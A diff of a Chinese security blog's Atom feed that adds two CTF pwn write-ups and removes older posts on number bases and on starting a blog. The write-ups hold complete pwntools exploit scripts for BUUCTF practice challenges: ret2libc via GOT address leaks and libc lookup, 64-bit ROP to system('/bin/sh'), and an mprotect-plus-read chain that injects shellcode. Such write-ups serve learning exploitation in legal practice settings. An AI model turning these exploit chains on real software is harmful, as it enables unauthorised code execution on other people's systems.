@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://meowketer.github.io</id>
     <title>Winghr&apos;s Blog</title>
-    <updated>2020-03-26T15:55:39.639Z</updated>
+    <updated>2020-04-10T13:24:11.455Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://meowketer.github.io"/>
     <link rel="self" href="https://meowketer.github.io/atom.xml"/>
@@ -10,6 +10,237 @@
     <logo>https://meowketer.github.io/images/avatar.png</logo>
     <icon>https://meowketer.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Winghr&apos;s Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[BUU-Pwn遇到的两道小坑]]></title>
+        <id>https://meowketer.github.io/post/buu3/</id>
+        <link href="https://meowketer.github.io/post/buu3/">
+        </link>
+        <updated>2020-04-10T11:39:45.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x1-概括">0x1 概括</h2>
+<p>最近按照顺序刷了不少BUU的题目，大多都是常规的栈溢出，比较简单。<br>
+但是在这个过程还是遇到了一些麻烦，例如本文中将描述的两道题目：<br>
+jarvisoj_level3 &amp; jarvisoj_level3_x64<br>
+这两道题目在jarvisoj平台上的原题很简单，就是常规的ret2libc，并且提供libc文件<br>
+那么第一个坑就是：在BUU平台的这两道题目没有提供libc文件<br>
+第二个坑则是：题目来源的git上有libc文件，可惜，事实上远程端口上运行的不是这个libc版本。<br>
+第三个坑是：还是因为菜。</p>
+<h2 id="0x2-初步尝试">0x2 初步尝试</h2>
+<p>由于使用错误的libc是无法获取真正的函数偏移，就无法计算出真实能够完成系统调用的地址。<br>
+因此，当写完攻击脚本，得到的结果会是：<br>
+<img src="https://meowketer.github.io/post-images/1586519555820.png" alt="" loading="lazy"><br>
+于是，采用了和jarvisoj_level4 一样的方法，直接link出远程libc中的偏移，从而计算基地址加偏移完成计算。<br>
+<img src="https://meowketer.github.io/post-images/1586519908627.png" alt="" loading="lazy"><br>
+图中便是level4 link 成功的主要部分代码，然而事实上用在level3上没有想象的那样美好<br>
+报错了，，用我浅薄的知识面来猜测，应该是远程环境是有一定差异的。于是便陷入了困境</p>
+<p>----------几天后----------<br>
+对这两个题目仍是念念不忘，但是随着时间的流逝，我终于醒悟了，问题就是出在libc上<br>
+在看一下漏洞函数：<br>
+<img src="https://meowketer.github.io/post-images/1586520328314.png" alt="" loading="lazy"><br>
+攻击思路很简单，就是通过泄露write函数的地址后计算偏移，进而求得系统调用地址<br>
+那么需要解决的问题便是解决libc版本这个坑<br>
+由于题目开启了ALSR地址随机化，所以每次加载内部各函数的地址都会变化。<br>
+但是，有一点不能忘的细节，那就是地址随机化，不是全部的地址，通常地址的最后三位是仍不变的<br>
+利用这个特性，我们就可以查询对应函数的libc后三位基地址来确定其libc版本。<br>
+这里我采用的是libc-database  这是github的一个开源项目https://github.com/lieanu/libc-database<br>
+它有如下几个功能：</p>
+<ul>
+<li>/add 用来添加libc库<br>
+<code>./add /usr/lib/libc-2.21.so</code></li>
+<li>./find 用来查找libc版本<br>
+<code>$ ./find printf 260</code><br>
+<code>archive-glibc (id libc6_2.19-10ubuntu2_i386)</code></li>
+<li>./dump 用来输出libc中的一些函数的偏移</li>
+</ul>
+<pre><code>$ ./dump libc6_2.19-0ubuntu6.6_i386
+offset___libc_start_main_ret = 0x19a83
+offset_system = 0x00040190
+offset_recv = 0x000ed2d0
+offset_str_bin_sh = 0x160a24
+</code></pre>
+<p>那么我们就可以手动查找一下是否存在对应版本的libc文件<br>
+首先还是常规的函数地址泄露：</p>
+<pre><code>payload = &quot;A&quot; * offset
+payload += p32(write_plt)
+payload += p32(start_addr)
+payload += p32(1)
+payload += p32(write_got)
+payload += p32(4)
+p.sendline(payload)
+write_addr =u32(p.recv(4))
+print (&quot;[+]write_addr=&quot;)+hex(write_addr)
+</code></pre>
+<p>接下来在取得泄露地址后，我们取地址的后三位进行libc版本查找：</p>
+<p><img src="https://meowketer.github.io/post-images/1586521824100.png" alt="" loading="lazy"><br>
+在这里明显可以看到后三位的基地址为3c0,那么去到libc-database查询一手：<br>
+<img src="https://meowketer.github.io/post-images/1586521948331.png" alt="" loading="lazy"><br>
+那么这样就得到和远程环境相同的libc版本了，接下来就是常规计算偏移取得shell...<br>
+其实到这里就已经恍然大悟，原来这道题目完全可以用LibcSearcher模块自动link,因为这个模块本就是基于libc_database写的python库。。这样一看还是比pwntools自带的DynELF香一点的感觉，不过好在手动查找libc也不麻烦，多花一分钟的时间问题不大。</p>
+<h2 id="0x3-level3完整exp">0x3 level3完整exp:</h2>
+<pre><code>#!/usr/bin/python
+#coding:utf-8
+from pwn import*
+context.log_level=&quot;debug&quot;  
+
+local = 0
+if local:
+	p = process('./level3')
+	elf = ELF('./level3')
+else:
+	p = remote('node3.buuoj.cn',25556)
+	elf = ELF('level3')
+
+start_addr = 0x8048350  
+write_got = elf.got[&quot;write&quot;]
+write_plt = elf.symbols[&quot;write&quot;]
+print (&quot;[+]write_plt=&quot;)+hex(write_plt)
+print (&quot;[+]write_got=&quot;)+hex(write_got)
+
+offset= 0x88 +4
+ 
+p.recvuntil(&quot;Input:\n&quot;)
+
+payload = &quot;A&quot; * offset
+payload += p32(write_plt)
+payload += p32(start_addr)
+payload += p32(1)
+payload += p32(write_got)
+payload += p32(4)
+p.sendline(payload)
+libc = ELF(&quot;libc6-i386_2.23-0ubuntu10_amd64.so&quot;)
+write_addr =u32(p.recv(4))
+print (&quot;[+]write_addr=&quot;)+hex(write_addr)
+
+write_offset = libc.symbols[&quot;write&quot;]      
+libc_base = write_addr - write_offset
+system_offset = libc.symbols[&quot;system&quot;]
+system = libc_base + system_offset   
+
+libc_sh=libc.search('/bin/sh\x00').next()
+bin_sh_addr = libc_base + libc_sh 
+print (&quot;system=&quot;) +hex(system)
+print (&quot;bin_sh_addr=&quot;) +hex(bin_sh_addr)
+p.recvline()
+payload = &quot;A&quot;*offset + p32(system) + p32(0) + p32(bin_sh_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="0x4-level32_x64">0x4 level32_x64</h2>
+<p>64位和32位主要的差异就是传参方式，在补充一次64位汇编传参：<br>
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样<br>
+简而言之，在64位程序中传参我们需要借助&quot;pop|rdi,ret&quot;等等一些寄存器来构造ROP链，并且在最后传入系统调用payload时还要注意堆栈平衡。通常这里会使用一段ret地址传入系统调用，还需要加入一段地址充当返回地址。<br>
+完整exp:</p>
+<pre><code>from pwn import *
+
+# p = process('./level3_x64')
+p = remote(&quot;node3.buuoj.cn&quot;, 25706)
+
+elf = ELF('./level3_x64')
+libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')
+
+rdi = 0x4006b3 
+rsi = 0x4006b1
+
+func_addr = elf.symbols['vulnerable_function'] 
+write_plt = elf.plt['write']  
+read_got = elf.got['read']
+
+payload = 'A' * 0x80 + 'B' * 0x08
+payload += p64(rdi) + p64(1)
+payload += p64(rsi) + p64(read_got) + p64(0)
+payload += p64(write_plt) + p64(func_addr)
+
+p.recvuntil('Input:\n')
+p.sendline(payload)
+
+read_addr = u64(p.recv(8))
+print 'read' + hex(read_addr)
+p.recvuntil('Input:\n')
+binsh = libc.search('/bin/sh').next()
+system = libc.symbols['system']
+read = libc.symbols['read']
+offset = read_addr - read
+binsh_addr = binsh + offset
+system_addr = system + offset
+
+payload2 = 'A' * 0x80 + 'B' * 0x08
+payload2 += p64(rdi) + p64(binsh_addr)
+payload2 += p64(system_addr) + p64(func_addr)
+p.sendline(payload2)
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[not_the_same_3dsctf_2016_WP]]></title>
+        <id>https://meowketer.github.io/post/not_the_same_3dsctf_2016_wp/</id>
+        <link href="https://meowketer.github.io/post/not_the_same_3dsctf_2016_wp/">
+        </link>
+        <updated>2020-04-06T13:05:15.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x1程序的漏洞点">0x1程序的漏洞点</h2>
+<p><img src="https://meowketer.github.io/post-images/1586178472496.png" alt="" loading="lazy"><br>
+<img src="https://meowketer.github.io/post-images/1586178531796.png" alt="" loading="lazy"></p>
+<h2 id="0x2利用思路1">0x2利用思路1</h2>
+<p>图中可以直观的看到，有一个后门程序将flag输出到一段bss段上<br>
+可以采用程序已有的write函数，通过rop把flag打印出来。<br>
+exp<br>
+<img src="https://meowketer.github.io/post-images/1586178933606.png" alt="" loading="lazy"><br>
+其中溢出后首先接入的是利用部分的子程序起始，bss地址为&amp;fl4g的地址，之后便是write函数输出部分。<br>
+利用结果：<br>
+<img src="https://meowketer.github.io/post-images/1586179186351.png" alt="" loading="lazy"><br>
+能够按照预期正常输出flag，但是后半段内容大概未能完成堆栈平衡，所以出现了崩溃。</p>
+<h2 id="0x3第二种利用思路">0x3第二种利用思路</h2>
+<p>使用mprotect修改内存读写属性，之后写入shellcode取得控制权。<br>
+先贴一下exp:</p>
+<pre><code>```python
+#!/usr/bin/env python
+#coding=utf8 
+
+from pwn import *
+elf = ELF('./not')
+sh = remote('node3.buuoj.cn', 25336)
+pop3_ret = 0x08050b45 #ROPgedget --binary not -- only &quot;pop|ret&quot;
+
+mem_addr = 0x080eb000 #可读可写的内存,但不可执行 ,gdb,vmmap取 0x80ea000  0x80ec000 rw-p     2000 a1000 
+mem_size = 0x1000    #通过调试出来的值，上面取到的是中间部分也就是0x1000大小
+mem_proc = 0x7       #可代表可读可写可执行  7 = 4 + 2 +1 (rwx)
+
+mprotect_addr = elf.symbols['mprotect']
+read_addr = elf.symbols['read']
+
+'''
+为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.
+'''
+payload_01 = 'A' * 0x2d
+payload_01 += p32(mprotect_addr)
+payload_01 += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12
+
+#mprotect 的三个参数
+payload_01 += p32(mem_addr)   #mprotect函数参数1 修改的内存地址
+payload_01 += p32(mem_size)   #mprotect函数参数2 修改的内存大小
+payload_01 += p32(mem_proc)   #mprotect函数参数3 修改的权限
+
+payload_01 += p32(read_addr) #执行完pop3_ret后弹到read地址
+
+payload_01 += p32(pop3_ret)  #执行完read后将返回到pop3_ret指令,又继续使esp+12
+
+#read 的三个参数
+payload_01 += p32(0)     #read函数参数1 ,从输入端读取
+payload_01 += p32(mem_addr)   #读取到的内容复制到指向的内存里
+payload_01 += p32(0x100) #读取大小
+
+payload_01 += p32(mem_addr)   #执行完read后ret esi
+
+sh.sendline(payload_01)
+payload_sh = asm(shellcraft.sh(),arch = 'i386', os = 'linux') 
+sh.sendline(payload_sh)
+sh.interactive()
+```
+</code></pre>
+<p>运行结果：<br>
+<img src="https://meowketer.github.io/post-images/1586180838311.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[有关ret2libc利用方法的整理]]></title>
         <id>https://meowketer.github.io/post/p=1/</id>
@@ -432,115 +663,6 @@ sar 11010101 1111 0101<br>
 对应C语言（&gt;&gt;）<br>
 int a = 10;<br>
 printf(&quot;%d\n,a&gt;&gt;2&quot;);</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[编程学习基础－－进制学习笔记整理（上）]]></title>
-        <id>https://meowketer.github.io/post/jinzhishang/</id>
-        <link href="https://meowketer.github.io/post/jinzhishang/">
-        </link>
-        <updated>2019-08-04T14:15:04.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="关于笔记">关于笔记</h1>
-<p>这篇笔记的整理是围绕的进制的学习以及汇编基础的学习<br>
-为啥要学这些基础的东西嘞？<br>
-像是进制，从小学的计算机课中就开始出现在课本上了<br>
-大概就是学了很多年，也一直没搞清楚二进制于十进制的转化这样简答的事情。<br>
-由于在最近的阶段需要学习一些编程语言，来进一步完成对漏洞挖掘等相关知识的理解，所以我就准备从最基础的一些东西来学习，因为将来很长一段时间可能需要面对二进制以及十六进制形式的数据咯。当然通过汇编来进一步了解程序在运行过程中对硬件底层的实质原理等。所以开始补补基础的东东辽。之前在学习的过程中是通过jupyter笔记本来做记录的，虽然能完成笔记的记录作用但是总的来说还是有点散乱。</p>
-<hr>
-<h1 id="一进制">一．进制</h1>
-<p>1.计算机中只认识二进制，0和1 首先要理解什么是进制。</p>
-<p>2.进制的学习姿势<br>
-进制学习过程中转化为其他进制来理解是错误的学习方式<br>
-例如学习二进制总把它转化为十进制来理解，进制之间本是相对独立的，要单独针对于某一个进制本身来学习及理解 忘掉进制间的转化，改变对于十进制过于熟悉的理解方式来转化学习其他进制。</p>
-<p>3.进制的定义<br>
-例如八进制的定义：由八个符号组成，分别是0 1 2 3 4 5 6 7 逢八进一。 N进制定义：由N个符号组成，逢N进一。</p>
-<p>4.进制的书写<br>
-1.查数（三进制来举例子） 2.进位☆<br>
-0   1   2       　　 　  #当0  1  2 之后查第二行时  需要两个数字来表达先用00填空开始查数<br>
-10  11   12       　　 #由于第一行已经到2 所以要进位则00中后面那个位进位查数为0第一个位再次向后查数为1<br>
-20  21   22       　　 #由上一行结尾12 由2进位一位为0由1进位一位为2则下一个数为20<br>
-100 101  102      　 # 22进位 最后一位2查下一个数为0 第一个2查数为0进1 22的下一个数位100<br>
-110 111  112<br>
-120 121  122      　 # 112 2进位0进1 第二位1加进的1为2 120<br>
-200 201  202<br>
-所以总结来说，每一种进制的存在都是独立而完美的通过查数来完成进制的书写</p>
-<h1 id="二进制运算">二．进制运算</h1>
-<p>1.运算的本质也是查数。<br>
-例如8进制的运算</p>
-<p>0 1 2 3 4 5 6 7 10 11 12 13 14 15 16 17 20 21 22 23 24 25 26 27 ...<br>
-2+3=?则为从2开始向后查三个数为5<br>
-2<em>3=？为两个3或三个二向后查数为6<br>
-4+4=？为4开始向后查5个数为11<br>
-4</em>5=？从第一个5开始往后查三组5一共四组为24</p>
-<h1 id="三二进制十六进制">三．二进制&amp;十六进制</h1>
-<p>计算机为啥使用二进制？<br>
-计算机通电工作，电路只有两种状态：1（通电）0（未通电） 计算机储存的任何文件，接收任何指令都是0和1组成的。</p>
-<p>二进制的书写<br>
-0000  0001  0010  0011  0100  0101  0110  0111  1000  1001  1010  1011  1100  1101  1110  1111<br>
-其中，依次一一对应的十六进制为：<br>
-0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F</p>
-<p>要习惯于十六进制因为十六进制一些方面来说是二进制的简写形式</p>
-<p>十六进制存在在计算机中最大的价值就是二进制的简写形式，它方便人们的阅读。要习惯他们的对应关系例如：<br>
-6D 6F 64 65　　　　依次对应的二进制：<br>
-0110 1101 0110 1111 0110 0100 0110 0101</p>
-<h1 id="四数据宽度">四．数据宽度</h1>
-<p>１.什么时数据宽度？<br>
-在计算机中，由于受硬件的约束，数据都是有长度限制的，这个长度限制称之为数据宽度。<br>
-当然，超过最多宽度数据将被丢弃。</p>
-<p>２.常见的数据宽度：<br>
-（1）位（bit） 只能存一个数值<br>
-（2）字节（byte）由八个位组成<br>
-（3）字（word）十六个位<br>
-（4）双字（doubleword）32位</p>
-<p>3.字节存储的范围：<br>
-八个位当中从00000000到11111111 十六进制则为00到FF<br>
-即：<br>
-字节：0～0xFF<br>
-字 ： 0～0xFFFF<br>
-双字：0～0xFFFFFFFF</p>
-<p>如果储存的数据超过最大宽度，多余数据将被丢弃！<br>
-例如C语言中的 char x = 0x1FF   (char)位 在这个实例当中 1会被丢弃<br>
-　　　　   int(32双字)</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[写博客：记录，分享&收获]]></title>
-        <id>https://meowketer.github.io/post/xie-bo-ke-ji-lu-fen-xiang-andshou-huo/</id>
-        <link href="https://meowketer.github.io/post/xie-bo-ke-ji-lu-fen-xiang-andshou-huo/">
-        </link>
-        <updated>2019-07-28T16:09:41.000Z</updated>
-        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
-<li><a href="#%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2">第一篇博客</a>
-<ul>
-<li><a href="#%E5%85%B3%E4%BA%8E%E6%88%91">关于我</a></li>
-<li><a href="#%E9%80%89%E6%8B%A9">选择</a></li>
-<li><a href="#%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2">我的博客</a></li>
-</ul>
-</li>
-</ul>
-(对待博客的认识&amp;准备)</p>
-<h1 id="第一篇博客">第一篇博客</h1>
-<p>在这之前我从来没有认真写过博客，对于博客虽然很早就有听说过，但是对它的概念一直很模糊。</p>
-<p>直到前不久，我意识到无论是在生活中还是在学习技术的过程中，有太多的想法与细节需要放到一个地方做总结与整合。它的作用不仅仅只是记录。更多的是一种分享，尤其是技术方面而言。在我学习的过程中查阅过的大量资料，这便是有过前车之鉴的朋友们所做的知识整合与分享。</p>
-<p>如果有人问我为什么也要准备开始分享自己花费不少时间一点点摸索一点点积累的一些知识呢？我会毫不犹豫的回答到，在我学习的过程中本就是借鉴了其他人大量的分享，正因为有着许多人共同的分享，才使得相关领域的技术以及知识不断的向前更新迈步。也正因为我们踩着巨人的肩膀所以我们一直有收获与进步~</p>
-<p>所以，博客便是这样一个记录与分享的平台。我的分享与记录也便从此开始~<br>
-开始慢慢的写文章（虽然没有啥文笔可言）开始点滴记录我所走过的坑（虽然技术菜的一批）开始分享我的经验（虽然现在一点经验都没有）开始追逐大佬们的步伐（这个是真的诶！！）</p>
-<h2 id="关于我">关于我</h2>
-<p>大家好，我是Winghr</p>
-<hr>
-<p>关于我<br>
-大概在四五年前第一次接触到黑客这样的名词，，感觉什么远控啊，攻击其他人的网站啊还有满屏的五颜六色的代码啊啥的感觉太帅惹~~~（现在想想真的好沙雕）</p>
-<p>但由于当时只是好奇、加上学业繁重，，并没有形成多浓厚的兴趣便一直处于好奇的阶段，在两年前的一天把好奇转为了兴趣，于是慢慢踏入了信息安全的大门，在两年的时间内没有啥方向一直就是这儿学点儿那学点儿的，虽然了解了很多但是没有啥精通一点的东东。</p>
-<p>后来有幸认识了一个相关行业的导师跟他交流了很多，了解到在信息安全领域中，像是我这样前期找不到方向便去多方面的“但当涉猎”也是有好处滴，因为信息安全的领域很大要学习和努力的地方本就很多。so.在找到一个确切方向之前我还是会学习很多知识，尤其是最基础的一些东东。</p>
-<h2 id="选择">选择</h2>
-<p>在一个月前我慢慢发现我对于很多知识点的整理与积累不够系统，有些知识的整合例如CTF练习题的wp放在了文件夹中，有些像是二进制汇编等知识的学习笔记放在了jupyter笔记本中，也有一些文章写在了一些论坛中。</p>
-<p>有看过很多大佬写的关于博客的文章，例如：为什么要写博客，，，写博客的种种好处。。。。嗯，，说的很对，让我有好多的收获。<br>
-总结来讲就是记录，分享以及收获~</p>
-<p>记录一些好的点子以及技术细节，分享你的经验与研究成果，收获一份意义与价值。</p>
-<h2 id="我的博客">我的博客</h2>
-<p>在写这些文章的过程，我会经历回顾整理知识的阶段，能在中国阶段中获得对知识巩固与更深的理解。这本是一种收获。<br>
-如果我的分享能给他人带来一些帮助，解决一些问题，我的这份分享便也会有一份意义咯，这也是一份沉淀的收获把~</p>
-<p>所以即便我的博客没有一个人看，我也会坚持去写，，因为总有一天会通过这一点点的积累收获很多很多~</p>
 ]]></content>
     </entry>
 </feed>
